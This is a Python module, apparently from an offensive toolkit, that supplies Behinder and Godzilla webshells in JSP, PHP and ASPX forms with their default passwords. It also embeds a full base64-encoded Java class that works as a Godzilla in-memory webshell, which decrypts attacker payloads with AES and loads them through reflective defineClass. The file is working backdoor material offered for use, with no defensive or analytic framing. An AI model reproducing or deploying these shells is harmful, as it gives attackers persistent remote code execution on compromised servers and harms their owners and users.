import os
from .webshell import Webshell, BehinderWebshell, GodzillaWebshell, DefineClassWebshell


BEHINDER_DEFAULT_PASS = "rebeyond"

GODZILLA_DEFAULT_PASS = "pass"
GODZILLA_DEFAULT_KEY = "key"


def get_behinder4_jsp_shell(pas=BEHINDER_DEFAULT_PASS):
    webshell_path = os.path.join(os.path.dirname(__file__), "webshells", "behinder4", "default_aes", "shell.jsp")
    return BehinderWebshell(webshell_path, "jsp", "behinder4", "default_aes", pas)


def get_behinder4_php_shell(pas=BEHINDER_DEFAULT_PASS):
    webshell_path = os.path.join(os.path.dirname(__file__), "webshells", "behinder4", "default_aes", "shell.php")
    return BehinderWebshell(webshell_path, "php", "behinder4", "default_aes", pas)


def get_behinder4_aspx_shell(pas=BEHINDER_DEFAULT_PASS):
    webshell_path = os.path.join(os.path.dirname(__file__), "webshells", "behinder4", "default_aes", "shell.aspx")
    return BehinderWebshell(webshell_path, "aspx", "behinder4", "default_aes", pas)


def get_behinder3_aspx_shell(pas=BEHINDER_DEFAULT_PASS):
    webshell_path = os.path.join(os.path.dirname(__file__), "webshells", "behinder3", "shell.aspx")
    return BehinderWebshell(webshell_path, "aspx", "behinder3", "default", pas)


def get_godzilla_jsp_shell(pas=GODZILLA_DEFAULT_PASS, key=GODZILLA_DEFAULT_KEY):
    webshell_path = os.path.join(os.path.dirname(__file__), "webshells", "godzilla", "java_aes_base64.jsp")
    return GodzillaWebshell(webshell_path, "jsp", "godzilla", "java_aes_base64", pas, key)


def get_godzilla_jspx_shell(pas=GODZILLA_DEFAULT_PASS, key=GODZILLA_DEFAULT_KEY):
    webshell_path = os.path.join(os.path.dirname(__file__), "webshells", "godzilla", "java_aes_base64.jspx")
    return GodzillaWebshell(webshell_path, "jspx", "godzilla", "java_aes_base64", pas, key)


def get_godzilla_php_shell(pas=GODZILLA_DEFAULT_PASS, key=GODZILLA_DEFAULT_KEY):
    webshell_path = os.path.join(os.path.dirname(__file__), "webshells", "godzilla", "php_xor_base64.php")
    return GodzillaWebshell(webshell_path, "php", "godzilla", "php_xor_base64", pas, key)


def get_godzilla_aspx_shell(pas=GODZILLA_DEFAULT_PASS, key=GODZILLA_DEFAULT_KEY):
    webshell_path = os.path.join(os.path.dirname(__file__), "webshells", "godzilla", "cshap_aes_base64.aspx")
    return GodzillaWebshell(webshell_path, "aspx", "godzilla", "cshap_aes_base64", pas, key)


def get_godzilla_ashx_shell(pas=GODZILLA_DEFAULT_PASS, key=GODZILLA_DEFAULT_KEY):
    webshell_path = os.path.join(os.path.dirname(__file__), "webshells", "godzilla", "cshap_aes_base64.ashx")
    return GodzillaWebshell(webshell_path, "ashx", "godzilla", "cshap_aes_base64", pas, key)


def get_define_class_shell():
    # webshell 长度 1515
    webshell_path = os.path.join(os.path.dirname(__file__), "webshells", "other", "define_class_memshell.jsp")
    define_class_webshell = DefineClassWebshell(webshell_path, "jsp", "godzilla", "java_aes_base64", "PaSs", "key")
    # Godzilla PaSs / key
    define_class_webshell.shell_class = """yv66vgAAADMBKQoAKQCOCACPCQBRAJAIAJEJAFEAkgcAkwoABgCOCgAGAJQKAAYAlQoAUQCWCQBRAJcJAFEAmAkAUQCZCgBRAJoIAJsKAJwAnQcAngoAKgCfCgARAKAKAJwAoQoAnACiBwCjCACkCgClAKYKACoApwoApQCoBwCpCgClAKoKABsAqwoAGwCsCgAqAK0IAK4KACcArwgAsAoAJwCxCgCyALMKACkAtAgAtQcAtgcAaAcAtwcAuAgAuQoAJwC6CAC7CAC8CAC9CAC+CAC/CADACADBCQDCAMMKACcAxAoAsgDFBwDGBwDHCwDIAMkKAFEAygoAUQDLCwDIAMwIAM0LAM4AzwoA0ADRCgDQANIKAMIA0wsAzgDUCADVCwDIANQHANYKAEUAjgoAKQDXCwDYANkKACoA2goA2wDcCgApAJUKAEUA3QoAUQDeCgAqAN8KANsA4AoA2wDhBwDiAQACeGMBABJMamF2YS9sYW5nL1N0cmluZzsBAARwYXNzAQADbWQ1AQAOc2VydmxldFJlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAGPGluaXQ+AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAKTEdvZHppbGxhOwEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQACW0IBAAFtAQABWgEADVN0YWNrTWFwVGFibGUHAOIHAOMHAKMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAHUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQADcmV0BwC4AQAMYmFzZTY0RW5jb2RlAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAB0VuY29kZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAZiYXNlNjQBABFMamF2YS9sYW5nL0NsYXNzOwEAAmJzAQAFdmFsdWUBAApFeGNlcHRpb25zAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAARleGVjAQADKClWAQAGYXJyT3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAWYBAARkYXRhAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQANbV9kZWZpbmVjbGFzcwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7BwDkBwDlBwDmAQAKU291cmNlRmlsZQEADUdvZHppbGxhLmphdmEMAFoAgAEAEDNjNmUwYjhhOWMxNTIyNGEMAFIAUwEABFBhU3MMAFQAUwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDADnAOgMAOkA6gwAVQBvDABVAFMMAFYAVwwAWABZDAB/AIABAANBRVMHAOMMAOsA7AEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAO0A7gwAWgDvDADwAPEMAPIA8wEAE2phdmEvbGFuZy9FeGNlcHRpb24BAANNRDUHAPQMAOsA9QwA9gD3DAD4APkBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwA+gDuDABaAPsMAOkA/AwA/QDqAQAQamF2YS51dGlsLkJhc2U2NAwA/gD/AQAKZ2V0RW5jb2RlcgwBAAEBBwDkDAECAQMMAQQBBQEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAEGAQcBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgEAFWphdmEubGFuZy5DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzBwEIDAEJAHgMAQoBAQwBCwEMAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uBwENDAEOAG8MAHwAfQwAYQBiDAEPARABAAdwYXlsb2FkBwDmDAERARIHARMMARQBFQwBFgEXDAEYARkMARoBGwEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBHAEdBwEeDAEfASAMASEBIgcBIwwBJAElDAEmAO4MAHMAdAwBIQD8DAEnAIAMASgAgAEACEdvZHppbGxhAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAJmphdmEvbGFuZy9SZWZsZWN0aXZlT3BlcmF0aW9uRXhjZXB0aW9uAQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAB2RvRmluYWwBAAYoW0IpW0IBABtqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3QBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQAGbGVuZ3RoAQADKClJAQAGdXBkYXRlAQAHKFtCSUkpVgEABmRpZ2VzdAEABihJW0IpVgEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAC3RvQnl0ZUFycmF5AQAFZmx1c2gBAAVjbG9zZQAhAFEAKQAAAAUAAgBSAFMAAAACAFQAUwAAAAIAVQBTAAAAAgBWAFcAAAACAFgAWQAAAAYAAQBaAFsAAQBcAAAAmAADAAMAAAA+KrcAASoSArUAAyoSBLUABSq7AAZZtwAHKrQA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"""
    define_class_webshell.headers = "clz: Godzilla"
    return define_class_webshell


def get_shell_result(webshell: Webshell) -> dict:
    shell_result = {
        "pas": webshell.pas,
        "key": webshell.key,
        "tool": webshell.tool,
        "mode": webshell.mode,
        "type": webshell.type
    }
    return shell_result
